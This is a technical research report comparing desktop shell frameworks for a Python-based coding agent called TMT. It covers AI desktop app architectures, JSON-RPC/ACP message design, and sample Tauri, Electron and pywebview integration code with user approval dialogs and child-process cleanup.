# Web-technology desktop shells with a Python backend (final, 2026-10-01)

Research only. Stars, licenses and release dates were pulled from api.github.com / PyPI / npm on 2026-10-01 and cross-checked against a second source where noted. "(unverified)" marks claims from a single weak source or from my own reasoning. Effort estimates in section 11 are my own judgement, not sourced.

## 1. Comparison table

| Shell | License | Popularity (2026-10-01) | Bundle size (Windows) | Native feel (Win11) | Python integration | Auto-update | Verdict |
|---|---|---|---|---|---|---|---|
| **Tauri 2** | Apache-2.0 / MIT dual ([API](https://api.github.com/repos/tauri-apps/tauri)) | 111.5k stars; CLI v2.12.1 released 2026-09-30 ([API](https://api.github.com/repos/tauri-apps/tauri/releases/latest)) | Shell ~3-10 MB ([PkgPulse](https://www.pkgpulse.com/blog/best-desktop-app-frameworks-2026), [OpenReplay](https://blog.openreplay.com/comparing-electron-tauri-desktop-applications/)); add frozen Python (my estimate 30-80 MB, unverified) | System WebView2; good, modern Edge | Sidecar via `externalBin`, name `<bin>-x86_64-pc-windows-msvc.exe` ([docs](https://v2.tauri.app/develop/sidecar/)) | Updater plugin, minisign signatures ([docs](https://v2.tauri.app/plugin/updater/)); Authenticode incl. Azure Artifact Signing ([docs](https://v2.tauri.app/distribute/sign/windows/)) | **Pick 2** (small, needs Rust toolchain) |
| **pytauri** | Apache-2.0 | 1.4k stars; v0.8.0 released 2025-09-02, repo pushed 2026-10-01 ([API](https://api.github.com/repos/pytauri/pytauri), [PyPI](https://pypi.org/pypi/pytauri/json)) | Tauri + embedded CPython | As Tauri | PyO3 in-process, no IPC; README calls itself "a fairly young project" ([README](https://github.com/pytauri/pytauri)) | Tauri updater | Risky: pre-1.0, 13 months since last release (stale-ish), one-person-scale community |
| **Electron** | MIT | 123.4k stars; v44.5.1 released 2026-09-30 ([API](https://api.github.com/repos/electron/electron/releases/latest)) | 80-150 MB installer ([OpenReplay](https://blog.openreplay.com/comparing-electron-tauri-desktop-applications/)); ChatGPT's app ~260 MB ([report](https://www.windowslatest.com/2024/10/18/i-tried-the-official-chatgpt-app-for-windows-11-its-just-an-electron-based-chrome-wrapper/)) | Bundled Chromium, identical everywhere; custom title bar/Mica possible | `child_process.spawn` of frozen exe | electron-updater for NSIS ([docs](https://www.electron.build/docs/features/auto-update/)) | **Pick 1** (what Codex, Goose, Claude, Interpreter Workstation use) |
| **pywebview** | BSD-3-Clause | 6.07k stars; 6.2.1 released 2026-04-15 ([changelog](https://pywebview.flowrl.com/changelog), [API](https://api.github.com/repos/r0x0r/pywebview)); 6.0 was 2025-08-08 ([blog](https://pywebview.flowrl.com/blog/pywebview6)) | Python + pythonnet, few MB on top of frozen Python | WebView2 inside WinForms; OK, basic chrome | In-process: Python hosts the window, `js_api`, `window.state` (6.0), `evaluate_js`; can bundle WebView2 via `WEBVIEW2_RUNTIME_PATH` (6.1, 2025-10-21) | None built in | Best all-Python option; weakest packaging/update story. (PyPI JSON showed 6.2.1 as Dec 2024: conflicts with GitHub tag, I trust GitHub+changelog.) |
| **Eel** | MIT | 6.7k stars, **archived 2025-06-22**, last release 0.18.2 ([API](https://api.github.com/repos/python-eel/Eel), [PyPI](https://pypi.org/pypi/eel/json)) | n/a | Chrome app-mode window, needs Chrome/Edge | Bottle + websockets | none | **Reject: abandoned** |
| **Neutralinojs** | MIT (from my memory; GitHub API returns NOASSERTION, unverified) | 8.66k stars; v6.9.0 released 2026-07-24 ([API](https://api.github.com/repos/neutralinojs/neutralinojs/releases/latest)) | ~2 MB (unverified) | WebView2 | `os.spawnProcess` with stdOut/stdErr/exit events and `updateSpawnedProcess(stdIn)` ([docs](http://neutralino.js.org/docs/api/os/)) | Basic updater | Viable alternative, small ecosystem, no ready-made JS framework story |
| **Wails (Go)** | MIT | 36.4k stars; v3.0.0-beta.26 on 2026-09-25, still beta ([API](https://api.github.com/repos/wailsapp/wails), [releases](https://api.github.com/repos/wailsapp/wails/releases)) | Small | WebView2 | Go process spawning Python | v3 updater (beta) | Reject: adds Go, v3 not GA |
| **NiceGUI native** | MIT | 16.3k stars, pushed 2026-09-29 ([API](https://api.github.com/repos/zauberzeug/nicegui)) | Python + pywebview | pywebview window | Pure Python (FastAPI, Vue/Quasar, socket.io); `ui.run(native=True)`; PyInstaller packaging documented ([docs](https://nicegui.io/documentation/section_configuration_deployment)) | none | Plausible for a Python-only team; community chat apps exist, e.g. [nicechat](https://github.com/yihuang/nicechat). You still hand-build approval modals, diffs, sidebar, and are tied to NiceGUI's server-side-state model |
| **Streamlit/Gradio wrappers** (streamlit-desktop-app, stlite) | various | - | stlite = Pyodide/WASM ([stlite](https://stlite.net/desktop/)) | web-like | Pyodide cannot run subprocesses/threads the way TMT needs; streamlit-desktop-app wraps pywebview ([repo](https://github.com/ohtaman/streamlit-desktop-app)) | none | **Unsuitable.** Rerun-the-script model fights a live prompt box + blocking modal approvals + 10 live agent threads. Gradio has no desktop bundler ([issue](https://github.com/gradio-app/gradio/issues/7032)) |

## 2. Short notes

- **Tauri 2 + sidecar.** Documented path with many tutorials ([Tauri+FastAPI+PyInstaller](https://aiechoes.substack.com/p/building-production-ready-desktop)). Known Windows hazards: `tauri-plugin-shell` `child.kill()` does not kill the real process of a PyInstaller onefile exe because the bootloader and the app are two processes ([tauri #11686](https://github.com/tauri-apps/tauri/issues/11686), [#14360 kill-tree request](https://github.com/tauri-apps/tauri/issues/14360), [#4949](https://github.com/tauri-apps/tauri/issues/4949)); NSIS may not replace an updated sidecar ([#15134](https://github.com/tauri-apps/tauri/issues/15134)). Cline's own desktop build had the same orphan bug: `code-sidecar.exe` left running after exit on Windows 11 ([cline #14221](https://github.com/cline/cline/issues/14221)). Use PyInstaller onedir, a Job Object, plus a stdin-EOF watchdog.
- **Electron.** Safest rendering (Chromium everywhere), biggest ecosystem; Claude Code team says Electron is for shared web/desktop code and engineer familiarity ([dbreunig](https://www.dbreunig.com/2026/02/21/why-is-claude-an-electron-app.html)). TMT already ships on npm, so a Node toolchain is no new burden.
- **pywebview.** Engine can run in the same process (threads), eliminating IPC, sidecar freezing and orphans. Cons: only a handful of window events, no extension/devtools story beyond debug flag, WebView2 via pythonnet (WinForms) chrome, no updater ([HN thread](https://news.ycombinator.com/item?id=39665828)).
- **Eel**: archived; do not start new work on it.
- **Streamlit/Gradio/stlite**: see table; not suitable for a chat-style agent with modal approvals.

## 3. How real AI desktop apps are built (evidence)

| App | Shell | Backend + transport | Evidence |
|---|---|---|---|
| **Codex desktop (OpenAI, Win+Mac, Feb 2026)** | Electron (Forge, Vite, React 19, ProseMirror, Highlight.js) | Electron main spawns bundled `codex app-server` child; JSON-RPC 2.0 JSONL over stdio; methods `thread/start`, `turn/steer`, `turn/interrupt`, `command/exec` | [technical breakdown](https://www.kitze.io/posts/codex-electron-app-technical-breakdown), [app-server docs](https://developers.openai.com/codex/app-server), [Windows issue showing stdio transport](https://github.com/openai/codex/issues/43525), [Electron-specific Windows bugs](https://github.com/openai/codex/issues/25157) |
| **Goose (Block, 54.8k stars, Apache-2.0)** | Electron 40 + React 19 + Vite + Tailwind | Desktop spawns Rust `goosed` child; bespoke REST+SSE API (103 endpoints) on 127.0.0.1; migrating to ACP over HTTP/WebSocket | [discussion 7697](https://github.com/block/goose/discussions/7697), [goose 2.0 blog](https://goose-docs.ai/blog/2026/04/08/goose-acp-and-new-tui/), [API](https://api.github.com/repos/block/goose), [DeepWiki](https://deepwiki.com/block/goose) |
| **Open Interpreter / Interpreter Workstation** | Electron (electron-builder.yml, tsconfig.electron.json in repo); desktop and browser renderers | Open Interpreter "owns the agent runtime ... and app-server protocol"; the shell talks to it over that protocol, local or remote | [repo](https://github.com/openinterpreter/interpreter-workstation) (16 stars, Apache-2.0: tiny project) |
| **Jan (44.7k stars)** | Tauri + React | Bundles llama.cpp, local OpenAI-compatible API on 127.0.0.1:1337 | [API](https://api.github.com/repos/janhq/jan), [DeepWiki](https://deepwiki.com/janhq/jan); license shown as Apache-2.0 after May 2025 relicense per [review](https://petronellatech.com/blog/jan-ai-local-first-llm/) while GitHub API says NOASSERTION |
| **LM Studio** | Electron | v0.4+ split the core into `llmster`, a headless daemon with REST API; GUI is a client | [LM Studio docs](https://lmstudio.ai/docs/app/basics/lmstudio-vs-llmster-vs-lms), [headless](https://lmstudio.ai/docs/developer/core/headless) |
| **Claude Desktop** | Electron | Not publicly documented; Claude Code team cites shared web/desktop code | [dbreunig](https://www.dbreunig.com/2026/02/21/why-is-claude-an-electron-app.html), [Windows Electron wrapper article](https://www.positioniseverything.net/after-chatgpt-claude-ais-windows-11-app-is-another-chrome-based-electron-wrapper/) |
| **ChatGPT desktop** | Electron (~260 MB on Windows), including the Mac app | n/a (closed) | [Windows Latest](https://www.windowslatest.com/2024/10/18/i-tried-the-official-chatgpt-app-for-windows-11-its-just-an-electron-based-chrome-wrapper/), [Notebookcheck](https://www.notebookcheck.net/The-ChatGPT-app-for-Windows-is-simply-an-Electron-based-web-app.903810.0.html) |
| **Cursor** | Electron (VS Code fork) | Closed; extension-host model | [Graphite](https://graphite.com/guides/cursor-vs-vscode-comparison) |
| **Cline** | VS Code webview (React) | gRPC-over-postMessage to extension host; standalone "ProtoBus" gRPC server on port 26040 | [DeepWiki](https://deepwiki.com/cline/cline/6.1-grpc-communication-system) |
| **Zed** | Native Rust (GPUI), not web | Hosts external agents (Claude, Codex, Gemini CLI, Copilot) as ACP child processes over stdio | [Zed ACP agents](https://zed.dev/acp/agent/claude-agent), [Zed 1.0 note](https://thecodersblog.com/zed-1-0-a-new-era-for-collaborative-code-editing-2026/) |

**Pattern:** 6 of 8 web-based agent apps are Electron; the dominant pattern is "UI shell spawns the agent engine as a child process and speaks structured JSON (JSON-RPC over stdio, or HTTP+SSE/WebSocket on loopback)". Only Jan (inference app, not an agent) uses Tauri. Cline's Windows sidecar orphan bug shows the process-lifetime pitfall is real.

## 4. IPC patterns and pitfalls

Most common: **JSON-RPC 2.0 over stdio** (LSP, MCP, ACP, Codex app-server). Second: **loopback HTTP + SSE/WebSocket** (Goose, Jan, Cline standalone). Named pipes are rare in this space (my observation).

| Pitfall | Detail / mitigation | Source |
|---|---|---|
| stdout pollution | Any stray `print()` or library output corrupts the stream. At engine start do `proto = sys.stdout; sys.stdout = sys.stderr`, keep `proto` for NDJSON only | design practice (MCP/ACP stdio specs require stdout be protocol-only: [ACP intro](https://agentclientprotocol.com/get-started/introduction)) |
| stdout buffering in frozen exe | PyInstaller binaries did not honour `PYTHONUNBUFFERED` when parent is a pipe; use the `u` bootloader option in the spec, and `flush=True` on every message | [pyinstaller #8426](https://github.com/pyinstaller/pyinstaller/issues/8426) |
| onefile = two processes | Killing the bootloader orphans the real process; use onedir (also faster start, fewer AV hits) | [pyinstaller #2533](https://github.com/pyinstaller/pyinstaller/issues/2533), [tauri #11686](https://github.com/tauri-apps/tauri/issues/11686) |
| Zombie after parent crash | Electron's `before-quit` never runs on crash; backend keeps running (and could keep acting). Fix: kill-on-close Job Object, and/or engine exits on stdin EOF / parent-PID watchdog | [rotki PR 713](https://github.com/rotki/rotki/pull/713), [Old New Thing](https://devblogs.microsoft.com/oldnewthing/20131209-00/?p=2433), [Meziantou](https://www.meziantou.net/killing-all-child-processes-when-the-parent-exits-job-object.htm) |
| Console window flash | `--noconsole` parents spawning children without `CREATE_NO_WINDOW` (0x08000000) / `STARTUPINFO` hide flash a console; Electron `windowsHide: true` | [PyInstaller list](https://groups.google.com/g/PyInstaller/c/-4Fdy7suh0U/m/0fkG7P1u7ysJ) |
| Engine's own children (shell tool) | TMT's `run_shell` children also need tree-kill on cancel (`taskkill /T /F` or Job Object) | Job Object docs above |
| Antivirus false positives | PyInstaller bootloader and onefile self-extraction look like malware; sign the exe, prefer onedir, submit to vendors | [pythonguis](https://www.pythonguis.com/faq/problems-with-antivirus-software-and-pyinstaller/), [PyInstaller discussion](https://github.com/orgs/pyinstaller/discussions/5877) |
| WebView2 runtime | Evergreen runtime is preinstalled on Windows 11; Windows 10 may need bootstrapper/standalone installer; "fixed version" can be bundled (pywebview 6.1 supports it) | [Microsoft docs](https://learn.microsoft.com/en-us/microsoft-edge/webview2/concepts/evergreen-vs-fixed-version) |
| Large messages / back-pressure | One JSON object per line, cap line size, never block the engine thread on a slow UI write (use a queue) | design practice |

## 5. ACP deep dive: can TMT adopt the Agent Client Protocol?

**Governance and version.** ACP was created by Zed (Aug 2025) with JetBrains as co-developer (Oct 2025) ([morphllm](https://www.morphllm.com/agent-client-protocol)). Repo `agentclientprotocol/agent-client-protocol`: 4,359 stars, Apache-2.0, latest `schema-v1.24.1` published 2026-09-30, pushed 2026-10-01 ([API](https://api.github.com/repos/agentclientprotocol/agent-client-protocol), [release](https://api.github.com/repos/agentclientprotocol/agent-client-protocol/releases/latest)). Very active; a v1.x schema with an "unstable" channel for experimental features.

**Wire format.** JSON-RPC 2.0 over stdio; agent methods `initialize`, `authenticate`, `session/new`, `session/prompt`, `session/load`, `session/set_mode`, `session/cancel` (notification); client methods `session/request_permission`, `fs/read_text_file`, `fs/write_text_file`, `terminal/create|output|kill`, `elicitation/create`; notification `session/update` ([overview](https://agentclientprotocol.com/protocol/overview)). Update types: `agent_message_chunk`, `agent_thought_chunk`, `user_message_chunk`, `tool_call`, `tool_call_update`, `plan`, `available_commands_update`, `current_mode_update`, `config_option_update`, `usage_update`; stop reasons `end_turn|max_tokens|max_turn_requests|refusal|cancelled` ([prompt turn](https://agentclientprotocol.com/protocol/prompt-turn)). Tool calls have `toolCallId`, `title`, `kind` (read, edit, delete, move, search, execute, think, fetch, switch_mode, other), status `pending|in_progress|completed|failed`, content blocks including **diffs** and terminal output; permission options `allow_once|allow_always|reject_once|reject_always` ([tool calls](https://agentclientprotocol.com/protocol/tool-calls)). Slash commands are advertised via `available_commands_update` and invoked as `/cmd` text in the prompt ([slash commands](https://agentclientprotocol.com/protocol/slash-commands)). Cancellation: agent must stop LLM requests and tool calls "as soon as possible" and return `cancelled`.

**Clients today** ([clients list](https://agentclientprotocol.com/overview/clients)): Zed, JetBrains IDEs, VS Code (several extensions incl. ACP Client, ACP Pro), Neovim (CodeCompanion, avante.nvim and others), Emacs (agent-shell), Sublime, Qt Creator, Unity, Obsidian, Visual Studio (via Poolside). **Windows desktop/standalone GUI clients exist**: AcpAgentClient (Rust, GPL-3.0), OctoShell (Rust/Tauri), Superlite, VibeAround, ACP UI (cross-platform incl. Windows). So an off-the-shelf Windows GUI for an ACP agent exists today, quality unverified.

**Python SDK** ([repo](https://github.com/agentclientprotocol/python-sdk), [PyPI](https://pypi.org/pypi/agent-client-protocol/json)): `agent-client-protocol` 0.12.1 (2026-08-16), a 1.0.0rc2 pre-release exists, 331 stars, Apache-2.0, **requires Python >=3.10**, Pydantic models, async base classes, stdio transport, permission/streaming examples. **Conflict for TMT**: TMT targets Python 3.8+ and is stdlib-only. Options: (a) ship the ACP adapter as an optional extra requiring 3.10+; (b) hand-roll the ~20 ACP messages with `json` (the protocol is small; recommended to keep the stdlib-only rule). The Pydantic dependency also breaks "stdlib-only".

### Mapping TMT events onto ACP

| TMT event / call | ACP message | Fit |
|---|---|---|
| user submits prompt | `session/prompt` (request; response = stopReason) | Exact |
| text stream | `session/update` `agent_message_chunk` | Exact |
| thinking/reasoning text | `agent_thought_chunk` | Exact |
| tool start / progress / finish | `tool_call` (pending/in_progress) + `tool_call_update` (completed/failed), `kind` + `locations` | Exact; TMT's tool names map onto `kind` |
| file edit with diff | tool_call content `{type: diff, path, oldText, newText}` | Exact, and clients render diffs natively |
| shell command output | embedded terminal content or `terminal/*` | Good |
| `approve(question, pattern) -> y/always/n` | agent->client request `session/request_permission` with options allow_once / allow_always / reject_once; response selects option or `cancelled` | Good; engine blocks on the JSON-RPC response. "always" = allow_always; TMT's glob `pattern` goes in tool_call title/rawInput. No standard way to carry the pattern, put it in `_meta` |
| `choose(text, keys)` multiple choice | `elicitation/create` (appears in spec overview; the doc page returned 404, so status draft/unstable, unverified), or abuse `session/request_permission` with custom option ids | Weak: not universally implemented by clients |
| `usage` (tokens, cost) | `usage_update` | Good |
| `plan.changed` | `plan` update (entries: content, priority, status; full replacement each time) | Exact |
| `turn.cancel` | `session/cancel` notification; reply `stopReason: cancelled` | Exact |
| `agents.changed` (background agent fleet, up to 10) | No concept. Options: one ACP `session` per background agent (multiple sessions are supported) with TMT's main session spawning them; or extension notification `_tmt/agents_changed` | Gap |
| undo preview/apply, checkpoints | None. Extension methods `_tmt/undo.preview`, `_tmt/undo.apply` (underscore-prefixed custom methods are allowed) | Gap |
| slash commands | `available_commands_update` + `/cmd` in prompt text | Exact |
| settings.get/set | `session/set_mode`, `config_option_update` cover modes/options only; rest via `_tmt/settings.*` | Partial |
| images in prompt | content blocks (image) | Good |

**Honest assessment.** Upside: very real. If TMT speaks ACP over stdio, then Zed, JetBrains, VS Code ACP extensions and several Windows desktop clients become TMT GUIs with zero custom UI, and the protocol is maintained by others (4.3k stars, weekly releases). It also validates the architecture: Codex and Goose both converged on structured JSON-RPC engines with separate UIs, and Goose is migrating to ACP. Downsides: (1) Python SDK needs 3.10+ and Pydantic (hand-roll instead); (2) the generic clients will not show TMT's distinctive features (agent fleet sidebar, undo, TMT-style choose dialog, settings pages), so a custom GUI is still needed for the full product; (3) the blocking "approve" maps cleanly but "choose" does not; (4) spec is moving (v1.24 schema, unstable channel): pin a protocol version and test against Zed. **Recommendation: make the engine's wire protocol "ACP core + `_tmt/*` extensions"**. The custom GUI uses the same protocol and the extensions, while stock ACP clients get the core subset. This costs little more than inventing a private protocol, and avoids a rewrite later. Caveat: this is my recommendation, not a sourced fact.

## 6. Recommended TMT JSON-RPC message catalogue

Framing: UTF-8 NDJSON (one JSON object per line, `\n` terminated), JSON-RPC 2.0, stdout = protocol only, stderr = logs. Names below are ACP-aligned where possible (ACP `session/update` kinds are shown in brackets); `_tmt/` prefix marks extensions. Notifications have no `id`.

```jsonc
// handshake (client -> engine, request)
{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":1,"clientInfo":{"name":"tmt-gui","version":"0.1.0"},"clientCapabilities":{"questions":true,"agentsPanel":true}}}
// -> {"id":1,"result":{"protocolVersion":1,"agentInfo":{"name":"tmt","version":"x"},"capabilities":{"undo":true,"agents":true}}}

// turn.start  (ACP: session/prompt)
{"jsonrpc":"2.0","id":2,"method":"turn.start","params":{"sessionId":"s1","prompt":[{"type":"text","text":"fix the failing test"}]}}
// final response: {"id":2,"result":{"stopReason":"end_turn"}}

// turn.cancel (notification; engine must answer turn.start with stopReason "cancelled")
{"jsonrpc":"2.0","method":"turn.cancel","params":{"sessionId":"s1"}}

// stream.text (engine -> client notification; ACP agent_message_chunk)
{"jsonrpc":"2.0","method":"stream.text","params":{"sessionId":"s1","kind":"message","text":"Looking at "}}

// turn.progress (ACP tool_call / tool_call_update)
{"jsonrpc":"2.0","method":"turn.progress","params":{"sessionId":"s1","toolCallId":"t7","title":"Edit app.py","kind":"edit","status":"in_progress","content":[{"type":"diff","path":"C:/p/app.py","oldText":"a","newText":"b"}]}}

// usage (ACP usage_update)
{"jsonrpc":"2.0","method":"usage","params":{"sessionId":"s1","inputTokens":1200,"outputTokens":340,"costUsd":0.011}}

// approval.request (engine -> client REQUEST; engine thread blocks on the response; ACP session/request_permission)
{"jsonrpc":"2.0","id":"e41","method":"approval.request","params":{"sessionId":"s1","toolCallId":"t8","question":"Run: git push origin main","pattern":"git push *","options":[{"id":"allow_once","name":"Allow once"},{"id":"allow_always","name":"Always allow git push *"},{"id":"reject_once","name":"Deny"}]}}
// -> {"jsonrpc":"2.0","id":"e41","result":{"outcome":{"outcome":"selected","optionId":"allow_always"}}}   (or {"outcome":{"outcome":"cancelled"}})
// NOTE: in real ACP the outcome is a NESTED object with an "outcome" discriminator, as above (see Appendix A, which runs against these field names).

// question.request (engine -> client REQUEST; blocks; ACP elicitation/create)
{"jsonrpc":"2.0","id":"e42","method":"question.request","params":{"sessionId":"s1","text":"Which database?","choices":[{"key":"1","label":"SQLite"},{"key":"2","label":"Postgres"}]}}
// -> {"id":"e42","result":{"key":"2"}}

// agents.changed (notification; TMT extension)
{"jsonrpc":"2.0","method":"_tmt/agents.changed","params":{"agents":[{"id":"a1","name":"tests","status":"running","turns":3,"lastLine":"pytest -x"}]}}

// plan.changed (ACP plan; full replacement)
{"jsonrpc":"2.0","method":"plan.changed","params":{"sessionId":"s1","entries":[{"content":"Reproduce bug","priority":"high","status":"completed"},{"content":"Fix","priority":"high","status":"in_progress"}]}}

// undo.preview / undo.apply (client -> engine requests; TMT extension)
{"jsonrpc":"2.0","id":9,"method":"_tmt/undo.preview","params":{"sessionId":"s1","steps":1}}
// -> {"id":9,"result":{"files":[{"path":"C:/p/app.py","diff":"--- a/app.py\n+++ b/app.py\n@@ ..."}]}}
{"jsonrpc":"2.0","id":10,"method":"_tmt/undo.apply","params":{"sessionId":"s1","steps":1}}

// settings.get / settings.set (requests)
{"jsonrpc":"2.0","id":11,"method":"settings.get","params":{"keys":["model","auto_approve"]}}
{"jsonrpc":"2.0","id":12,"method":"settings.set","params":{"key":"model","value":"claude-sonnet-5-5"}}
```

**Versioning advice.** (1) Integer `protocolVersion` negotiated in `initialize` (ACP does the same); bump only on breaking changes, additive fields never bump it. (2) Clients and servers ignore unknown fields and unknown notifications; unknown *requests* get error -32601. (3) Capabilities object for optional features instead of version checks. (4) Generate a JSON Schema from one source of truth (dataclasses to schema) and test both sides against it; keep golden NDJSON transcripts in the 2,600-test suite. (5) Mark experiments with the `_tmt/` prefix and `_meta` field as ACP does. (6) Each request needs an `id` unique per direction; engine-initiated ids use a different prefix (`e41`) to avoid collisions. (7) Treat `turn.start` as the long-running request whose response carries `stopReason`; never block the reader thread on it.

## 7. How TMT maps onto Tauri 2 + Python sidecar

Design: Rust spawns the frozen **onedir** exe (`tmt-engine.exe --rpc`), assigns it to a kill-on-close Job Object, relays NDJSON lines as Tauri events, and writes frontend replies to stdin. The engine additionally exits on stdin EOF (belt and braces). Approval blocks the engine because `approve()` sends a request and waits on a Future that the stdin-reader thread resolves.

```rust
// src-tauri/src/main.rs  (crates: tauri 2, win32job)
use std::{io::{BufRead, BufReader, Write}, process::{Command, Stdio, ChildStdin}, sync::Mutex};
use std::os::windows::process::CommandExt;
use tauri::{Emitter, Manager, State};
struct Engine(Mutex<ChildStdin>);

#[tauri::command]
fn rpc_send(line: String, eng: State<Engine>) -> Result<(), String> {
    let mut w = eng.0.lock().unwrap();                // frontend -> engine (requests, replies, turn.cancel)
    writeln!(w, "{line}").and_then(|_| w.flush()).map_err(|e| e.to_string())
}

fn main() {
    tauri::Builder::default().setup(|app| {
        let exe = app.path().resource_dir()?.join("engine/tmt-engine.exe"); // onedir, shipped as resource
        let mut child = Command::new(exe).arg("--rpc")
            .creation_flags(0x0800_0000)               // CREATE_NO_WINDOW: no console flash
            .stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::null()).spawn()?;
        let job = win32job::Job::create()?;            // kill-on-close job: engine tree dies with us
        let mut info = job.query_extended_limit_info()?; info.limit_kill_on_job_close();
        job.set_extended_limit_info(&mut info)?;
        job.assign_process(child.as_raw_handle() as _)?;
        Box::leak(Box::new(job));                      // keep handle open for process lifetime
        let stdin = child.stdin.take().unwrap(); let out = child.stdout.take().unwrap();
        app.manage(Engine(Mutex::new(stdin)));
        let h = app.handle().clone();
        std::thread::spawn(move || for line in BufReader::new(out).lines().flatten() {
            let _ = h.emit("engine", line);            // stream.text, approval.request, ... all go to JS
        });
        Ok(())
    }).invoke_handler(tauri::generate_handler![rpc_send]).run(tauri::generate_context!()).unwrap();
}
```
```ts
// frontend (React/Svelte). stream, approval and cancel:
import { listen } from "@tauri-apps/api/event"; import { invoke } from "@tauri-apps/api/core";
const send = (m: object) => invoke("rpc_send", { line: JSON.stringify(m) });
await listen<string>("engine", ({ payload }) => {
  const m = JSON.parse(payload);
  if (m.method === "stream.text") appendMarkdown(m.params.text);          // batched via requestAnimationFrame
  else if (m.method === "approval.request") showDialog(m.params).then(optionId => // Allow once / Always / Deny
        send({ jsonrpc: "2.0", id: m.id, result: { outcome: { outcome: "selected", optionId } } }));
});
cancelBtn.onclick = () => send({ jsonrpc: "2.0", method: "turn.cancel", params: { sessionId } });
```
```python
# engine side (Python 3.8, stdlib): blocking approval
import sys, json, threading, itertools
proto, sys.stdout = sys.stdout, sys.stderr              # protect the wire
pending, ids, wlock = {}, itertools.count(1), threading.Lock()
def send(o):
    with wlock: proto.write(json.dumps(o) + "\n"); proto.flush()
def approve(question, pattern):                          # called on the engine thread
    rid = f"e{next(ids)}"; ev = threading.Event(); pending[rid] = [ev, None]
    send({"jsonrpc":"2.0","id":rid,"method":"approval.request","params":{"question":question,"pattern":pattern}})
    ev.wait()                                            # BLOCKS the engine thread until the user clicks
    return {"allow_once":"y","allow_always":"always"}.get(pending.pop(rid)[1], "n")
def reader():                                            # stdin thread
    for line in sys.stdin:
        m = json.loads(line)
        if "method" not in m and m["id"] in pending:     # reply to our request
            pending[m["id"]][1] = m["result"]["outcome"].get("optionId"); pending[m["id"]][0].set()
        elif m.get("method") == "turn.cancel": cancel_event.set()
    cancel_event.set(); import os; os._exit(0)           # stdin EOF => parent gone => exit
```
Notes: build with PyInstaller onedir plus `u` option; ship as Tauri `resources` (not `externalBin`) to avoid onefile double-process and the NSIS replace bug, or use `externalBin` with onefile only if the Job Object is in place. Requires Rust + MSVC build tools; the `win32job` crate and exact method names are from memory (unverified): check docs before use.

## 8. How TMT maps onto Electron

Design identical to Codex desktop: main process spawns the engine, relays lines to the renderer through a preload bridge ([Codex breakdown](https://www.kitze.io/posts/codex-electron-app-technical-breakdown)). Kill: engine exits on stdin EOF, plus `taskkill /PID /T /F` on `will-quit` (Node has no Job Object API without a native addon).

```js
// main.js
const { app, BrowserWindow, ipcMain } = require('electron');
const { spawn, execFile } = require('child_process'); const readline = require('readline'); const path = require('path');
let engine, win;
function startEngine() {
  const exe = path.join(process.resourcesPath, 'engine', 'tmt-engine.exe');          // PyInstaller onedir via extraResources
  engine = spawn(exe, ['--rpc'], { windowsHide: true, stdio: ['pipe', 'pipe', 'inherit'] }); // windowsHide = CREATE_NO_WINDOW
  readline.createInterface({ input: engine.stdout }).on('line', l => win.webContents.send('engine', l));
  engine.on('exit', code => win?.webContents.send('engine-exit', code));
}
const killEngine = () => { if (engine && !engine.killed)
  execFile('taskkill', ['/PID', String(engine.pid), '/T', '/F']); };                // tree-kill, incl. shell-tool children
app.whenReady().then(() => {
  win = new BrowserWindow({ webPreferences: { preload: path.join(__dirname, 'preload.js') } });
  startEngine(); win.loadFile('index.html');
});
ipcMain.on('rpc-send', (_e, line) => engine.stdin.write(line + '\n'));              // requests, approval replies, turn.cancel
app.on('will-quit', killEngine); process.on('exit', killEngine);
// if Electron crashes: the engine sees stdin EOF and calls os._exit(0)
```
```js
// preload.js: contextBridge.exposeInMainWorld('tmt', { send: l => ipcRenderer.send('rpc-send', l),
//   onMessage: cb => ipcRenderer.on('engine', (_e, l) => cb(JSON.parse(l))) })
// renderer:
tmt.onMessage(m => {
  if (m.method === 'stream.text') appendMarkdown(m.params.text);
  if (m.method === 'approval.request') showDialog(m.params).then(optionId =>   // modal: Allow once / Always / Deny
      tmt.send(JSON.stringify({ jsonrpc: '2.0', id: m.id, result: { outcome: { outcome: 'selected', optionId } } })));
});
cancelBtn.onclick = () => tmt.send(JSON.stringify({ jsonrpc: '2.0', method: 'turn.cancel', params: { sessionId } }));
```
The Python engine side is the same as section 7. Electron-specific: electron-builder NSIS target for auto-update; sign with Authenticode or Azure Artifact Signing.

## 9. How TMT maps onto pywebview

Design: no sidecar. Python owns the process; the engine runs on worker threads inside it; `js_api` methods are callable from JS; Python pushes events with `window.evaluate_js`. Approval blocks the engine thread on a `threading.Event` set by `js_api.answer`. Death of the window = death of the engine (one process, so no orphans except the engine's own shell children, which TMT already manages).

```python
import json, threading, itertools, webview          # pip install pywebview (6.2.1)
class Api:
    def __init__(self, engine): self.engine, self.pending, self.ids = engine, {}, itertools.count(1)
    # ---- JS -> Python (runs on a pywebview worker thread) ----
    def start_turn(self, text):
        threading.Thread(target=self.engine.run_turn, args=(text,), daemon=True).start()
    def cancel(self):            self.engine.cancel_event.set()
    def answer(self, rid, choice):                    # Allow once / Always / Deny
        slot = self.pending[rid]; slot[1] = choice; slot[0].set()
    # ---- Python -> JS ----
    def push(self, method, params):                   # thread-safe; json.dumps makes it a safe JS literal
        window.evaluate_js(f"window.onEngine({json.dumps({'method': method, 'params': params})})")
    def approve(self, question, pattern):             # called by the engine thread
        rid = str(next(self.ids)); slot = self.pending[rid] = [threading.Event(), "n"]
        self.push("approval.request", {"id": rid, "question": question, "pattern": pattern})
        slot[0].wait()                                # BLOCKS the engine thread until the user clicks
        return self.pending.pop(rid)[1]

engine = TmtEngine(on_text=lambda t: api.push("stream.text", {"text": t}),
                   on_approve=lambda q, p: api.approve(q, p))
api = Api(engine)
window = webview.create_window("TMT", "ui/index.html", js_api=api, width=1200, height=800)
webview.start(debug=False)        # blocks on main thread; engine threads are daemon
```
```js
// ui: stream, approval and cancel
window.onEngine = m => {
  if (m.method === 'stream.text') appendMarkdown(m.params.text);
  if (m.method === 'approval.request') showDialog(m.params).then(c => pywebview.api.answer(m.params.id, c));
};
cancelBtn.onclick = () => pywebview.api.cancel();
```
Notes: `window.state` (6.0) can synchronise agent-fleet state automatically ([6.0 blog](https://pywebview.flowrl.com/blog/pywebview6)). Rapid `evaluate_js` calls cross a COM/WinForms boundary; batch text chunks (e.g. 30-50 ms) (my engineering judgement, unverified). Freeze with PyInstaller onedir (hidden imports for pythonnet/clr). Caveat: pywebview must run on the main thread; TMT's current main thread must therefore hand the engine to workers.

